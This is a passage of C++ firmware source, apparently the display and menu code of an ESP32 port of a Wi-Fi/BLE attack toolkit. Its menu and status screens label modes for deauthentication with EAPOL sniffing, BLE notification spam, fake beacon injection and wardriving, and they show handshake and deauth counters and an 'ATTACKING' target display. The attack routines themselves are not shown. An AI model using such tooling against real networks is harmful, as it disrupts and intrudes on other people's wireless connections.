  void setSelectedIdx(uint8_t i);
  uint8_t getSelectedIdx();
  const SirloinDevice* getDevice(uint8_t i);
}
namespace WarhogMode {
  uint32_t getTotalNets();
  float    getDistanceKm();
}
namespace PiggyBlues {
  uint32_t getPackets();
}
namespace BaconMode {
  uint8_t        getTier();
  uint16_t       getInterval();
  uint32_t       getBeaconCount();
  uint8_t        getAPCount();
  const BaconAP* getAPs();
  float          getBeaconRate();
  static const uint8_t BACON_CHANNEL = 6;
}
namespace SerialDump {
  void dumpAll(float lat=0.0f, float lon=0.0f);
}

// ============================================================
// WEBUI FORWARD DECLARATIONS
// ============================================================
namespace WebUI {
  void start();
  void stop();
  void update();
  bool isActive();
}

// ============================================================
// DISPLAY SYSTEM
// ============================================================
namespace Display {

// About quote index
uint8_t aboutQuoteIdx = 0;

// Toast state
char toastMsg[160] = {0};
uint32_t toastStart = 0;
uint32_t toastDuration = 2000;
bool toastActive = false;

// Top bar message
char topBarMsg[96] = {0};
uint32_t topBarMsgStart = 0;
uint32_t topBarMsgDuration = 0;

// PWNED banner — set when OinkMode captures a handshake, shown in top bar
char lootSSID[33] = {0};

void init() {
  // tft.begin() already called in setup() — do NOT call again
  // Allocate sprite for flicker-free rendering (called AFTER SD init is skipped,
  // so HSPI is stable and heap is not fragmented)
  mainSprite.setColorDepth(16);
  if (mainSprite.createSprite(DISPLAY_W, MAIN_H)) {
    Serial.println("[DISPLAY] Sprite 320x200 16bpp OK");
  } else {
    // 320*200*2 = 128KB might be tight; try smaller
    if (mainSprite.createSprite(DISPLAY_W, 160)) {
      Serial.println("[DISPLAY] Sprite 320x160 16bpp OK");
    } else {
      Serial.println("[DISPLAY] Sprite alloc failed — direct draw mode");
    }
  }
  Serial.printf("[DISPLAY] Free heap after sprite: %u largest: %u\n",
                ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
}

void setTopBarMessage(const char* msg, uint32_t duration = 0) {
  if (!msg) { topBarMsg[0] = '\0'; return; }
  strncpy(topBarMsg, msg, sizeof(topBarMsg)-1);
  topBarMsg[sizeof(topBarMsg)-1] = '\0';
  topBarMsgStart = millis();
  topBarMsgDuration = duration;
}

void showToast(const char* msg, uint32_t dur = 2000) {
  if (!msg || !msg[0]) return;
  strncpy(toastMsg, msg, sizeof(toastMsg)-1);
  toastMsg[sizeof(toastMsg)-1] = '\0';
  toastStart = millis();
  toastDuration = dur;
  toastActive = true;
}

bool isToastActive() { return toastActive; }

// Draw top bar directly to TFT (no sprite — saves memory)
void drawTopBar() {
  tft.fillRect(0, 0, DISPLAY_W, TOP_BAR_H, colorFG());
  tft.setTextColor(colorBG(), colorFG());
  tft.setTextSize(1);

  // Custom top bar message (highest priority)
  if (topBarMsg[0] != '\0') {
    if (topBarMsgDuration > 0 && (millis() - topBarMsgStart) > topBarMsgDuration)
      topBarMsg[0] = '\0';
    else {
      tft.setTextDatum(TL_DATUM);
      tft.drawString(topBarMsg, 2, 6);
      return;
    }
  }

  // Mode string — matches original labels exactly
  const char* modeBuf = "IDLE";
  switch (currentMode) {
    case PorkchopMode::OINK_MODE:        modeBuf = "OINKS"; break;
    case PorkchopMode::DNH_MODE:         modeBuf = "DONOHAM"; break;
    case PorkchopMode::WARHOG_MODE:      modeBuf = "SGT WARHOG"; break;
    case PorkchopMode::PIGGYBLUES_MODE:  modeBuf = "BLUES"; break;
    case PorkchopMode::SPECTRUM_MODE:    modeBuf = "HOG ON SPECTRUM"; break;
    case PorkchopMode::MENU:             modeBuf = "MENU"; break;
    case PorkchopMode::SETTINGS:         modeBuf = "CONFIG"; break;
    case PorkchopMode::ABOUT:            modeBuf = "ABOUTPIG"; break;
    case PorkchopMode::DIAGNOSTICS:      modeBuf = "DIAGDATA"; break;
    case PorkchopMode::CAPTURES:         modeBuf = "L00T"; break;
    case PorkchopMode::ACHIEVEMENTS:     modeBuf = "PR00F"; break;
    case PorkchopMode::SWINE_STATS:      modeBuf = "SW1N3 ST4TS"; break;
    case PorkchopMode::BOAR_BROS:        modeBuf = "B04R BR0S"; break;
    case PorkchopMode::UNLOCKABLES:      modeBuf = "UNL0CK4BL3S"; break;
    case PorkchopMode::BOUNTY_STATUS:    modeBuf = "B0UNT13S"; break;
    case PorkchopMode::BACON_MODE:       modeBuf = "BACON"; break;
    default: modeBuf = "IDLE"; break;
  }

  // Mood label
  int h = Mood::getEffectiveHappiness();
  const char* mood = (h>70)?"HYP3":(h>30)?"GUD":(h>-10)?"0K":(h>-50)?"M3H":"S4D";

  // Build left string — OINK adds PWNED banner if a handshake was just captured
  char left[80];
  if (currentMode == PorkchopMode::OINK_MODE && lootSSID[0] != '\0') {
    char upper[20]; strncpy(upper, lootSSID, 19); upper[19] = '\0';
    for (int i = 0; upper[i]; i++) upper[i] = toupper((uint8_t)upper[i]);
    snprintf(left, sizeof(left), "%s %s PWNED %s", modeBuf, mood, upper);
  } else {
    snprintf(left, sizeof(left), "%s %s", modeBuf, mood);
  }

  // Right: L{n} N:{nets} CH{ch} {up}
  uint32_t upSec = (millis() - bootTime) / 1000;
  char right[48];
  snprintf(right, sizeof(right), "L%d N:%03d CH%02d %u:%02u",
           XP::getLevel(), NetworkRecon::getNetworkCount(),
           NetworkRecon::getChannel(), upSec/60, upSec%60);

  // Truncate left if it would overlap right
  int rightW = tft.textWidth(right);
  int maxLeftW = DISPLAY_W - rightW - 8;
  size_t leftLen = strlen(left);
  while (tft.textWidth(left) > maxLeftW && leftLen > 4) {
    left[--leftLen] = '\0';
  }

  tft.setTextDatum(TL_DATUM);
  tft.drawString(left, 2, 6);
  tft.setTextDatum(TR_DATUM);
  tft.drawString(right, DISPLAY_W - 2, 6);
}

// Draw bottom bar directly to TFT
void drawBottomBar() {
  // Inverted: FG background, BG text (matches original)
  tft.fillRect(0, DISPLAY_H - BOTTOM_BAR_H, DISPLAY_W, BOTTOM_BAR_H, colorFG());
  tft.setTextColor(colorBG(), colorFG());
  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);

  char statsBuf[96] = {0};
  bool showHealthBar = false;
  uint8_t ch = NetworkRecon::getChannel();

  switch (currentMode) {
    case PorkchopMode::OINK_MODE: {
      bool locking = OinkMode::isLocking();
      if (locking) {
        const char* tSSID = OinkMode::getTargetSSID();
        char ssid[19]; strncpy(ssid, tSSID, 18); ssid[18] = '\0';
        for (int i=0; ssid[i]; i++) ssid[i] = toupper((uint8_t)ssid[i]);
        snprintf(statsBuf, sizeof(statsBuf), "LOCK:%s CH:%02d", ssid, ch);
      } else {
        snprintf(statsBuf, sizeof(statsBuf), "N:%03d HS:%02d D:%04lu CH:%02d",
                 NetworkRecon::getNetworkCount(),
                 OinkMode::getHandshakeCount(),
                 OinkMode::getDeauthCount(), ch);
      }
      break;
    }
    case PorkchopMode::DNH_MODE:
      snprintf(statsBuf, sizeof(statsBuf), "N:%03d P:%02d HS:%02d CH:%02d",
               NetworkRecon::getNetworkCount(),
               DNHMode::getPMKIDCount(),
               DNHMode::getHSCount(), ch);
      break;
    case PorkchopMode::WARHOG_MODE:
      if (gpsHasFix)
        snprintf(statsBuf, sizeof(statsBuf), "U:%03lu D:%.1fKM [%.4f,%.4f]",
                 WarhogMode::getTotalNets(),
                 WarhogMode::getDistanceKm(),
                 gpsLat, gpsLon);
      else
        snprintf(statsBuf, sizeof(statsBuf), "U:%03lu GPS:%02dSAT",
                 WarhogMode::getTotalNets(), gpsSats);
      break;
    case PorkchopMode::PIGGYBLUES_MODE:
      snprintf(statsBuf, sizeof(statsBuf), "BLE TX:%lu", PiggyBlues::getPackets());
      break;
    case PorkchopMode::BACON_MODE:
      snprintf(statsBuf, sizeof(statsBuf), "T%d %dMS TX:%lu APS:%d",
               BaconMode::getTier(), BaconMode::getInterval(),
               BaconMode::getBeaconCount(), BaconMode::getAPCount());
      break;
    case PorkchopMode::SPECTRUM_MODE:
      snprintf(statsBuf, sizeof(statsBuf), "CH:%.0fMHz [TAP]=SELECT",
               (double)NetworkRecon::getChannel() * 5.0 + 2407.0);
      break;
    case PorkchopMode::IDLE:
      snprintf(statsBuf, sizeof(statsBuf), "N:%03d", NetworkRecon::getNetworkCount());
      showHealthBar = true;
      break;
    case PorkchopMode::MENU:
      strcpy(statsBuf, "TAP=SELECT  HOLD=BACK");
      break;
    default:
      snprintf(statsBuf, sizeof(statsBuf), "N:%03d", NetworkRecon::getNetworkCount());
      showHealthBar = true;
      break;
  }

  tft.drawString(statsBuf, 2, DISPLAY_H - BOTTOM_BAR_H + 6);

  // Center: heap health bar (IDLE and menu screens — matches original)
  if (showHealthBar) {
    int pct = HeapHealth::getDisplayPercent();
    const int barW = 60, barH = 6, barY = DISPLAY_H - BOTTOM_BAR_H + 7;
    const int barX = (DISPLAY_W - barW) / 2;
    tft.drawRect(barX, barY, barW, barH, colorBG());
    int fillW = (barW - 2) * pct / 100;
    if (fillW > 0) tft.fillRect(barX+1, barY+1, fillW, barH-2, colorBG());
    char pctBuf[8]; snprintf(pctBuf, sizeof(pctBuf), "%d%%", pct);
    tft.setTextDatum(TL_DATUM);
    tft.drawString(pctBuf, barX + barW + 3, DISPLAY_H - BOTTOM_BAR_H + 6);
  }

  // Right: uptime (suppress on menu/submenu screens, matches original)
  bool hideUptime = (currentMode == PorkchopMode::MENU ||
                     currentMode == PorkchopMode::SETTINGS ||
                     currentMode == PorkchopMode::CAPTURES ||
                     currentMode == PorkchopMode::ACHIEVEMENTS ||
                     currentMode == PorkchopMode::ABOUT ||
                     currentMode == PorkchopMode::DIAGNOSTICS ||
                     currentMode == PorkchopMode::SWINE_STATS ||
                     currentMode == PorkchopMode::BOAR_BROS ||
                     currentMode == PorkchopMode::UNLOCKABLES ||
                     currentMode == PorkchopMode::BOUNTY_STATUS ||
                     currentMode == PorkchopMode::OINK_MODE ||
                     currentMode == PorkchopMode::DNH_MODE);
  if (!hideUptime) {
    uint32_t upSec = (millis() - bootTime) / 1000;
    char up[12]; snprintf(up, sizeof(up), "%u:%02u", upSec/60, upSec%60);
    tft.setTextDatum(TR_DATUM);
    tft.drawString(up, DISPLAY_W - 2, DISPLAY_H - BOTTOM_BAR_H + 6);
  }
}

// Draw a simple menu (for IDLE menu) directly on main canvas area
// Main draw for IDLE/OINK/DNH/WARHOG — avatar + bubble
void update() {
  static bool firstFrame = true;
  if (firstFrame) {
    Serial.printf("[UPDATE] spriteOk=%d mode=%d fg=0x%04X bg=0x%04X\n",
                  (int)mainSprite.created(), (int)currentMode, colorFG(), colorBG());
    firstFrame = false;
  }

  bool useSprite = mainSprite.created();
  int sprH = useSprite ? mainSprite.height() : 0;

  // Helper: draw string to sprite OR tft depending on useSprite
  // We just draw to the right target — macros would be messy, so duplicate per-mode below.

  // ── Top bar (always direct) ─────────────────────────────────────────────────
  drawTopBar();

  // ── Main area ───────────────────────────────────────────────────────────────
  if (useSprite) {
    mainSprite.fillSprite(colorBG());
  } else {
    tft.fillRect(0, TOP_BAR_H, DISPLAY_W, MAIN_H, colorBG());
  }

  switch (currentMode) {

    // ── IDLE: ASCII pig + speech bubble + weather ─────────────────────────────
    case PorkchopMode::IDLE: {
      if (useSprite) {
        // Thunder flash: invert background
        uint16_t bg = Weather::isThunderFlashing() ? colorFG() : colorBG();
        mainSprite.fillSprite(bg);
        Weather::drawClouds();   // clouds behind pig
        Avatar::draw();          // pig (draws to mainSprite internally)
        Weather::draw();         // rain + wind over background, under bubble
        Mood::drawBubble();
      } else {
        tft.setTextSize(3);
        tft.setTextDatum(TL_DATUM);
        tft.setTextColor(colorFG(), colorBG());
        int ax = Avatar::getCurrentX();
        int ay = TOP_BAR_H + 43;
        int si = (int)Avatar::state; if (si>=7) si=0;
        const char** fr = Avatar::facingRight ? Avatar::FRAMES_R[si] : Avatar::FRAMES_L[si];
        tft.drawString(fr[0], ax, ay);
        tft.drawString(fr[1], ax, ay+22);
        tft.drawString(fr[2], ax, ay+44);
        tft.setTextSize(1);
        tft.setTextColor(colorFG(), colorBG());
        tft.drawString(Avatar::getGrassPattern(), 0, TOP_BAR_H+152);
        tft.setTextDatum(TC_DATUM);
        tft.drawString(Mood::getCurrentPhrase(), DISPLAY_W/2, TOP_BAR_H+170);
      }
      break;
    }

    // ── MENU ─────────────────────────────────────────────────────────────────
    case PorkchopMode::MENU: {
      static const struct { const char* label; const char* hint; } items[] = {
        {"OINK MODE",    "deauth + sniff eapol"},
        {"DO NO HAM",    "passive recon, zero tx"},
        {"SGT WARHOG",   "wardriving + gps log"},
        {"PIGGY BLUES",  "ble notification spam"},
        {"BACON MODE",   "fake beacon injection"},
        {"SPECTRUM",     "rf channel analyzer"},
        {"SETTINGS",     "theme + config"},
        {"ABOUT",        "credits + quotes"},
        {"CAPTURES",     "loot + achievements"},
        {"SWINE STATS",  "xp + system info"},
        {"BOUNTY",       "target priority list"},
        {"BOAR BROS",    "esp-now peer sync"},
        {"UNLOCKABLES",  "secret phrases"},
        {"DIAGNOSTICS",  "heap + wifi health"},
        {"BACK",         "hold anywhere"},
      };
      static const int MENU_COUNT = 15;
      // menuScroll and menuSel are file-scope statics

      auto drawMenu = [&](auto& dst, int yOff) {
        // Header: size-2 title bar
        dst.setTextSize(2);
        dst.fillRect(0, yOff, DISPLAY_W, 18, colorFG());
        dst.setTextColor(colorBG(), colorFG());
        dst.setTextDatum(TL_DATUM);
        char hdr[28]; snprintf(hdr, sizeof(hdr), "PORKCHOP  L%d", XP::getLevel());
        dst.drawString(hdr, 6, yOff+1);
        dst.setTextDatum(TR_DATUM);
        char lvlxp[16]; snprintf(lvlxp, sizeof(lvlxp), "%lu XP", XP::getTotalXP());
        dst.drawString(lvlxp, DISPLAY_W-4, yOff+1);

        // List: show a window of items centered on selection
        dst.setTextSize(1);
        const int rowH = 11;
        const int listY = yOff + 20;
        const int visRows = 13;  // how many rows fit
        // Keep selected item visible — scroll window
        int scrollStart = menuSel - visRows/2;
        if (scrollStart < 0) scrollStart = 0;
        if (scrollStart > MENU_COUNT - visRows) scrollStart = MENU_COUNT - visRows;
        if (scrollStart < 0) scrollStart = 0;

        for (int vi = 0; vi < visRows && vi + scrollStart < MENU_COUNT; vi++) {
          int i = vi + scrollStart;
          int y = listY + vi * rowH;
          bool sel = (i == (int)menuSel);
          if (sel) {
            dst.fillRect(0, y, DISPLAY_W, rowH, colorFG());
            dst.setTextColor(colorBG(), colorFG());
          } else {
            dst.setTextColor(colorFG(), colorBG());
          }
          dst.setTextDatum(TL_DATUM);
          char num[4]; snprintf(num, sizeof(num), "%02d", i+1);
          dst.drawString(num, 3, y+2);
          dst.drawString(items[i].label, 20, y+2);
          if (sel) {
            // Show hint on selected row
            dst.setTextDatum(TR_DATUM);
            dst.setTextColor(colorBG(), colorFG());
            dst.drawString(items[i].hint, DISPLAY_W-3, y+2);
          }
        }

        dst.setTextColor(colorFG(), colorBG());

        // Navigation hint bar at bottom
        int barY = yOff + 20 + visRows * rowH + 2;
        dst.drawLine(0, barY, DISPLAY_W, barY, colorFG());
        dst.setTextSize(1);
        dst.setTextDatum(TL_DATUM);
        dst.drawString("\x18 TOP", 4, barY+3);          // up arrow
        dst.setTextDatum(TC_DATUM);
        dst.drawString("MID=select", DISPLAY_W/2, barY+3);
        dst.setTextDatum(TR_DATUM);
        dst.drawString("BOT \x19", DISPLAY_W-4, barY+3); // down arrow
      };
      if (useSprite) drawMenu(mainSprite, 0);
      else           drawMenu(tft, TOP_BAR_H);
      break;
    }

    // ── NETWORK MODES (OINK / DNH / WARHOG / PIGGYBLUES) ────────────────────
    // Original M5 UI: avatar + weather as background, minimal mode overlay on top
    case PorkchopMode::OINK_MODE:
    case PorkchopMode::DNH_MODE:
    case PorkchopMode::WARHOG_MODE:
    case PorkchopMode::PIGGYBLUES_MODE: {
      auto drawModeOverlay = [&](auto& dst, int yOff) {
        dst.setTextDatum(TL_DATUM);
        dst.setTextSize(1);

        if (currentMode == PorkchopMode::OINK_MODE) {
          const char* tSSID = OinkMode::getTargetSSID();
          if (tSSID && tSSID[0] != '\0') {
            // Attacking a target — show ATTACKING header
            char ssidBuf[17]; strncpy(ssidBuf, tSSID, 16); ssidBuf[16] = '\0';
            for (int i=0; ssidBuf[i]; i++) ssidBuf[i] = toupper((uint8_t)ssidBuf[i]);
            dst.setTextColor(colorFG(), colorBG());
            dst.drawString("ATTACKING:", 2, yOff+2);
            dst.setTextColor(colorFG(), colorBG());
            dst.drawString(ssidBuf, 2, yOff+14);
            char info[32];
            snprintf(info, sizeof(info), "[%s] TAP=BRO", OinkMode::getStateName());
            dst.setTextColor(colorFG()&0x7BEF, colorBG());
            dst.drawString(info, 2, yOff+26);
            dst.setTextColor(colorFG(), colorBG());
          } else if (NetworkRecon::getNetworkCount() > 0) {
            dst.setTextColor(colorFG(), colorBG());
            char buf[32];
            snprintf(buf, sizeof(buf), "FOUND %d TRUFFLES",
                     NetworkRecon::getNetworkCount());
            dst.drawString(buf, 2, yOff+14);
          }
          // Bottom stats line
          dst.setTextColor(colorFG(), colorBG());
          char stats[48];
          snprintf(stats, sizeof(stats), "HS:%02d PMKID:%02d D:%04lu BROS:%d",
                   OinkMode::getHandshakeCount(),
                   OinkMode::getPMKIDCount(),
                   OinkMode::getDeauthCount(),
                   OinkMode::getBoarBroCount());
          dst.drawString(stats, 2, yOff+MAIN_H-12);

        } else if (currentMode == PorkchopMode::DNH_MODE) {
          dst.setTextColor(colorFG(), colorBG());
          char buf[32];
          snprintf(buf, sizeof(buf), "N:%03d P:%02d HS:%02d",
                   NetworkRecon::getNetworkCount(),
                   DNHMode::getPMKIDCount(),
                   DNHMode::getHSCount());
          dst.drawString(buf, 2, yOff+MAIN_H-12);

        } else if (currentMode == PorkchopMode::WARHOG_MODE) {
          dst.setTextColor(colorFG(), colorBG());
          dst.drawString("WARDRIVING", 2, yOff+2);
          char buf[40];
          if (gpsHasFix)
            snprintf(buf, sizeof(buf), "GPS [%.4f,%.4f]", gpsLat, gpsLon);
          else
            snprintf(buf, sizeof(buf), "GPS SEARCHING [%dsat]", gpsSats);
          dst.drawString(buf, 2, yOff+MAIN_H-12);

        } else if (currentMode == PorkchopMode::PIGGYBLUES_MODE) {
          dst.setTextColor(colorFG(), colorBG());
          char buf[32];
          snprintf(buf, sizeof(buf), "BLE TX: %lu", PiggyBlues::getPackets());
          dst.drawString(buf, 2, yOff+MAIN_H-12);
        }
      };

      if (useSprite) {
        uint16_t bg = Weather::isThunderFlashing() ? colorFG() : colorBG();
        mainSprite.fillSprite(bg);
        Weather::drawClouds();
        Avatar::draw();
        Weather::draw();
        drawModeOverlay(mainSprite, 0);
        Mood::drawBubble();
      } else {
        uint16_t bg = Weather::isThunderFlashing() ? colorFG() : colorBG();
        tft.fillRect(0, TOP_BAR_H, DISPLAY_W, MAIN_H, bg);
        tft.setTextSize(3); tft.setTextDatum(TL_DATUM);
        tft.setTextColor(colorFG(), bg);
        int ax = Avatar::getCurrentX(), ay = TOP_BAR_H + 43;
        int si = (int)Avatar::state; if (si>=7) si=0;
        const char** fr = Avatar::facingRight ? Avatar::FRAMES_R[si] : Avatar::FRAMES_L[si];
        tft.drawString(fr[0], ax, ay);
        tft.drawString(fr[1], ax, ay+22);
        tft.drawString(fr[2], ax, ay+44);
        tft.setTextSize(1); tft.setTextColor(colorFG(), bg);
        tft.drawString(Avatar::getGrassPattern(), 0, TOP_BAR_H+152);
        drawModeOverlay(tft, TOP_BAR_H);
        tft.setTextDatum(TC_DATUM);
        tft.drawString(Mood::getCurrentPhrase(), DISPLAY_W/2, TOP_BAR_H+170);
      }
      break;
    }

    // ── SPECTRUM ─────────────────────────────────────────────────────────────
    case PorkchopMode::SPECTRUM_MODE: {
      // ── Update spectrum buffers from network data ─────────────────────────
      // Noise floor
      for (int x=0;x<SPEC_W;x++)
        specBuf[x] = -95 + (int8_t)(specNoise()>>1);
      // Accumulate sinc lobes from visible networks
      NetworkRecon::enterCritical();
      auto& snets = NetworkRecon::getNetworks();
      for (int ni=0;ni<(int)snets.size();ni++) {
        float cFreq = 2412.0f + (snets[ni].channel-1)*5.0f;
        int8_t rssi = snets[ni].rssiAvg ? snets[ni].rssiAvg : snets[ni].rssi;
        for (int x=0;x<SPEC_W;x++) {
          float freq = (specViewCtr-30.0f) + (float)x*60.0f/SPEC_W;
          float amp  = specSincAmp(freq-cFreq);
          if (amp<0.05f) continue;
          int8_t sig = -95 + (int8_t)((rssi+95)*amp);
          if (sig>specBuf[x]) specBuf[x]=sig;
        }
      }
      NetworkRecon::exitCritical();
      // Peak hold with decay
      for (int x=0;x<SPEC_W;x++) {
        if (specBuf[x]>specPeak[x]) specPeak[x]=specBuf[x];
        else if (specPeak[x]>-95) specPeak[x]--;
      }
      // Waterfall push every 80ms
      uint32_t _now=millis();
      if (_now-wfallLastMs>80) {
        wfallLastMs=_now;
        for (int x=0;x<SPEC_W;x++) {
          int inten=(int)((specBuf[x]+95)*255/65);
          wfallBuf[wfallRow][x]=(uint8_t)constrain(inten,0,255);
        }
        wfallRow=(wfallRow+1)%WFALL_ROWS;
      }
      // ── Draw ─────────────────────────────────────────────────────────────
      // N13TZSCH3 — stare into the ether for 15 minutes
      if (specEnterMs > 0 && (millis() - specEnterMs) >= 15UL*60000UL) {
        if (!XP::hasAchievement(ACH_NIETZSWINE)) {
          XP::unlockAchievement(ACH_NIETZSWINE);
          Display::showToast("THE ETHER DEAUTHS BACK");
        }
      }
      auto drawSpec = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        // Y-axis dB labels
        dst.setTextSize(1); dst.setTextDatum(MR_DATUM);
        for (int8_t db=-30;db>=-90;db-=20) {
          int y=yOff+specRssiToY(db);
          dst.drawFastHLine(SPEC_LEFT-2, y, 2, colorFG());
          char lb[5]; snprintf(lb,5,"%d",db);
          dst.drawString(lb, SPEC_LEFT-3, y);
        }
        // Baseline
        dst.drawFastVLine(SPEC_LEFT-1, yOff+SPEC_TOP, SPEC_BOT-SPEC_TOP, colorFG());
        dst.drawFastHLine(SPEC_LEFT-1, yOff+SPEC_BOT, SPEC_W+1, colorFG());
        // Noise grass
        for (int x=SPEC_LEFT;x<SPEC_LEFT+SPEC_W;x++) {
          int g=specNoise()>>1;
          if(g>0) dst.drawFastVLine(x, yOff+SPEC_BOT-g, g, colorFG());
        }
        // Spectrum line + fill (persistence via peak)
        for (int x=0;x<SPEC_W;x++) {
          int sy=yOff+specRssiToY(specBuf[x]);
          int by=yOff+SPEC_BOT;
          if(sy<by) dst.drawFastVLine(SPEC_LEFT+x, sy, by-sy, colorFG());
          // Peak dot
          int py=yOff+specRssiToY(specPeak[x]);
          if(py<by-1) dst.drawPixel(SPEC_LEFT+x, py, colorFG());
        }
        // Channel markers
        dst.setTextDatum(TC_DATUM); dst.setTextSize(1);
        for (int ch=1;ch<=13;ch++) {
          float f=2412.0f+(ch-1)*5.0f;
          int cx=specFreqToX(f,specViewCtr);
          if(cx<SPEC_LEFT||cx>=SPEC_LEFT+SPEC_W) continue;
          dst.drawFastVLine(cx, yOff+SPEC_BOT, 4, colorFG());
          char cb[4]; snprintf(cb,4,"%d",ch);
          dst.drawString(cb, cx, yOff+SPEC_BOT+5);
        }
        // Waterfall
        dst.drawFastHLine(SPEC_LEFT, yOff+WFALL_TOP-2, SPEC_W, colorFG());
        for (int row=0;row<WFALL_ROWS;row++) {
          int bufRow=(wfallRow+row)%WFALL_ROWS;
          int sy=yOff+WFALL_TOP+row;
          if(sy>=yOff+MAIN_H-10) break;
          for (int x=0;x<SPEC_W;x++) {
            uint8_t inten=wfallBuf[bufRow][x];
            if(inten<20) continue;
            bool draw=false;
            if(inten>200)       draw=true;
            else if(inten>150)  draw=((x+row)%2)==0;
            else if(inten>100)  draw=(x%2==0)&&(row%2==0);
            else if(inten>50)   draw=(x%3==0)&&(row%2==0);
            else                draw=(x%4==0)&&(row%3==0);
            if(draw) dst.drawPixel(SPEC_LEFT+x, sy, colorFG());
          }
        }
        // Selected network highlight + info
        if (specSelIdx>=0) {
          NetworkRecon::enterCritical();
          auto& hn=NetworkRecon::getNetworks();
          if(specSelIdx<(int)hn.size()) {
            float hf=2412.0f+(hn[specSelIdx].channel-1)*5.0f;
            int hx=specFreqToX(hf,specViewCtr);
            if(hx>=SPEC_LEFT&&hx<SPEC_LEFT+SPEC_W) {
              dst.drawFastVLine(hx, yOff+SPEC_TOP, SPEC_BOT-SPEC_TOP, colorFG()&0x7BEF);
              char si[48]; snprintf(si,sizeof(si),"%.16s %ddB CH%d",
                hn[specSelIdx].ssid[0]?hn[specSelIdx].ssid:"<hidden>",
                hn[specSelIdx].rssi, hn[specSelIdx].channel);
              dst.setTextDatum(TL_DATUM);
              dst.drawString(si, SPEC_LEFT+2, yOff+2);
            }
          }
          NetworkRecon::exitCritical();
        }
        // Hints
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP-L:< TAP-R:> TAP-C:sel HOLD:back", DISPLAY_W/2, yOff+MAIN_H-20);
      };
      if (useSprite) drawSpec(mainSprite, 0);
      else           drawSpec(tft,        TOP_BAR_H);
      break;
    }

    // ── SETTINGS ─────────────────────────────────────────────────────────────
    case PorkchopMode::SETTINGS: {
      auto drawSet = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1);
        dst.setTextDatum(TC_DATUM);
        dst.drawString("SETTINGS", DISPLAY_W/2, yOff+8);
        dst.setTextSize(1);
        dst.setTextDatum(TL_DATUM);
        dst.drawString("THEME: (tap to cycle)", 10, yOff+40);
        char tb[32]; snprintf(tb,sizeof(tb),"  >> %s <<", THEMES[cfg.themeIndex].name);
        dst.setTextSize(1);
        dst.drawString(tb, 10, yOff+58);
        dst.setTextSize(1);
        dst.drawString("TAP: next theme", 10, yOff+90);
        dst.drawString("HOLD: save + back", 10, yOff+106);
        // Show all 15 theme names as a grid (3 cols × 5 rows)
        for (int i=0; i<THEME_COUNT; i++) {
          int tx2 = 10 + (i%3)*105;
          int ty2 = yOff+125 + (i/3)*14;
          if (i==(int)cfg.themeIndex) {
            dst.setTextColor(colorBG(), colorFG());
          } else {
            dst.setTextColor(colorFG(), colorBG());
          }
          dst.drawString(THEMES[i].name, tx2, ty2);
        }
        dst.setTextColor(colorFG(), colorBG());
      };
      if (useSprite) drawSet(mainSprite, 0);
      else           drawSet(tft,        TOP_BAR_H);
      break;
    }

    // ── ABOUT ─────────────────────────────────────────────────────────────────
    case PorkchopMode::ABOUT: {
      static const char* quotes[] = {
        "HACK THE PLANET","SHALL WE PLAY A GAME","sudo make me bacon",
        "root@porkchop:~#","WHILE(1) { PWN(); }","#!/usr/bin/oink",
        "0WN3D BY 0ct0","CURIOSITY IS NOT A CRIME","TRUST NO AP",
        "PROMISCUOUS BY NATURE","802.11 WARL0RD","EXPLOIT ADAPT OVERCOME"
      };
      auto drawAbout2 = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1);
        dst.setTextDatum(TC_DATUM);
        dst.drawString("M5PORKCHOP", DISPLAY_W/2, yOff+8);
        dst.setTextSize(1);
        dst.drawString("by 0ct0sec", DISPLAY_W/2, yOff+34);
        dst.drawString("github.com/0ct0sec/M5PORKCHOP", DISPLAY_W/2, yOff+50);
        dst.drawString("CYD port - TFT_eSPI + ESP32", DISPLAY_W/2, yOff+66);
        dst.drawLine(20, yOff+84, DISPLAY_W-20, yOff+84, colorFG());
        dst.setTextSize(1);
        char qb[48]; snprintf(qb,sizeof(qb),"\"%s\"", quotes[Display::aboutQuoteIdx%12]);
        dst.drawString(qb, DISPLAY_W/2, yOff+96);
        dst.setTextSize(1);
        dst.drawString("TAP: cycle  HOLD: back", DISPLAY_W/2, yOff+MAIN_H-20);
      };
      if (useSprite) drawAbout2(mainSprite, 0);
      else           drawAbout2(tft,        TOP_BAR_H);
      break;
    }

    // ── CAPTURES ─────────────────────────────────────────────────────────────
    case PorkchopMode::CAPTURES: {
      auto drawCap = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1);
        dst.setTextDatum(TC_DATUM);

        if (!capShowChallengesFlag) {
          // ── Stats page ──────────────────────────────────────────────────
          dst.drawString("L00T", DISPLAY_W/2, yOff+8);
          char b[64];
          snprintf(b,sizeof(b),"HANDSHAKES : %d  PMKID: %d",
                   OinkMode::getHandshakeCount(), OinkMode::getPMKIDCount());
          dst.drawString(b, DISPLAY_W/2, yOff+38);
          snprintf(b,sizeof(b),"DEAUTHS    : %lu", OinkMode::getDeauthCount());
          dst.drawString(b, DISPLAY_W/2, yOff+54);
          snprintf(b,sizeof(b),"PASSIVE HS : %d", DNHMode::getHSCount());
          dst.drawString(b, DISPLAY_W/2, yOff+70);
          snprintf(b,sizeof(b),"NETWORKS   : %d", NetworkRecon::getNetworkCount());
          dst.drawString(b, DISPLAY_W/2, yOff+86);
          snprintf(b,sizeof(b),"WARHOG APs : %lu", WarhogMode::getTotalNets());
          dst.drawString(b, DISPLAY_W/2, yOff+102);
          snprintf(b,sizeof(b),"BLE TX     : %lu", PiggyBlues::getPackets());
          dst.drawString(b, DISPLAY_W/2, yOff+118);
          dst.drawLine(20, yOff+130, DISPLAY_W-20, yOff+130, colorFG());
          dst.drawString("TAP-L: back   TAP-R: challenges", DISPLAY_W/2, yOff+142);
          dst.drawString("HOLD >1.5s: serial dump", DISPLAY_W/2, yOff+160);
        } else {
          // ── Challenges page (P1G D3MANDS) ──────────────────────────────
          dst.drawString("P1G D3MANDS", DISPLAY_W/2, yOff+4);
          dst.drawLine(20, yOff+20, DISPLAY_W-20, yOff+20, colorFG());
          uint8_t n = Challenges::getActiveCount();
          if (n == 0) {
            dst.drawString("NO DEMANDS YET", DISPLAY_W/2, yOff+80);
          } else {
            int y = yOff+26;
